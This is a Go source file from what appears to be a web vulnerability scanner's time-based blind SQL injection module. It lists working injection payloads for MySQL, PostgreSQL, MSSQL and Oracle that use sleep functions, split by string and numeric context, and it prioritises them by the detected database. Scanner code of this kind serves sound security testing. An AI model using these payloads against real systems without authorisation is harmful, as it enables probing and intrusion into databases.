package sqli_time_blind

import (
	"fmt"

	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
)

// prioritizeByDBMS reorders payloads so those matching a DBMS already
// identified for this host (e.g. by the error-based module, recorded in the
// TechRegistry) are tried first. Combined with early-exit on the first
// confirmed pair this cuts requests sharply when the backend is known, without
// dropping coverage if the hint turns out to be wrong.
func prioritizeByDBMS(payloads []timePair, scanCtx *modkit.ScanContext, host string) []timePair {
	if scanCtx == nil || scanCtx.TechStack == nil {
		return payloads
	}
	known := map[string]bool{}
	for _, t := range []string{"mysql", "postgres", "mssql", "oracle"} {
		if scanCtx.TechStack.Has(host, infra.DBMSTechTag(t)) {
			known[t] = true
		}
	}
	if len(known) == 0 {
		return payloads
	}
	first := make([]timePair, 0, len(payloads))
	rest := make([]timePair, 0, len(payloads))
	for _, p := range payloads {
		if known[p.dbType] {
			first = append(first, p)
		} else {
			rest = append(rest, p)
		}
	}
	return append(first, rest...)
}

// timePair is a parametric time-based blind SQLi payload. The template carries a
// %d placeholder for the sleep seconds so the scanner can request different
// durations and verify the observed delay scales with the requested value —
// the core false-positive defense. Only backends whose delay scales with a
// numeric argument are included (MySQL SLEEP, PostgreSQL pg_sleep, MSSQL
// WAITFOR, Oracle DBMS_PIPE); SQLite's RANDOMBLOB delay is not expressible in
// seconds and cannot be scale-verified, so it is intentionally omitted here and
// left to the error-based / boolean-blind modules.
type timePair struct {
	context  string // "string", "numeric"
	dbType   string // "mysql", "postgres", "mssql", "oracle"
	template string // %d = sleep seconds
}

// render returns the payload fragment for the given sleep duration in seconds.
// seconds==0 yields the no-delay variant.
func (p timePair) render(seconds int) string {
	return fmt.Sprintf(p.template, seconds)
}

// stringPayloads are payloads for string context injection points.
var stringPayloads = []timePair{
	{context: "string", dbType: "mysql", template: "' OR SLEEP(%d)--"},
	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d)--"},
	{context: "string", dbType: "postgres", template: "'; SELECT pg_sleep(%d)--"},
	{context: "string", dbType: "postgres", template: "' OR (SELECT pg_sleep(%d))::text='1'--"},
	{context: "string", dbType: "mssql", template: "'; WAITFOR DELAY '0:0:%d'--"},
	{context: "string", dbType: "mssql", template: "' OR 1=1; WAITFOR DELAY '0:0:%d'--"},
	{context: "string", dbType: "oracle", template: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []timePair{
	{context: "numeric", dbType: "mysql", template: " OR SLEEP(%d)--"},
	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)--"},
	{context: "numeric", dbType: "postgres", template: "; SELECT pg_sleep(%d)--"},
	{context: "numeric", dbType: "mssql", template: "; WAITFOR DELAY '0:0:%d'--"},
	{context: "numeric", dbType: "oracle", template: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--"},
}

// getPayloadsForValue selects appropriate payloads based on the parameter's base value.
func getPayloadsForValue(baseValue string) []timePair {
	if infra.IsNumericValue(baseValue) {
		return numericPayloads
	}
	return stringPayloads
}
